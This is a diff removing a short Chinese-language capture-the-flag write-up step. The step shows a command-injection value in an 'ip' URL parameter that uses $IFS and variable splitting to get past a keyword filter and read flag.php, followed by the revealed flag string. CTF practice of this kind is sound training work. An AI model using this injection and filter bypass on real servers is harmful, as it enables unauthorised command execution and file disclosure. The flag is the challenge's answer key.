@@ -1,6 +1,0 @@
-过滤加上：?ip=127.0.0.1;a=ag;b=fl;cat$IFS$9$b$a.php
-查看源代码得到：
-<!--?php
-$flag = "flag{bea3ccb6-27c6-4491-832c-bc0275616f6d}";
-?-->
-即：flag{bea3ccb6-27c6-4491-832c-bc0275616f6d}
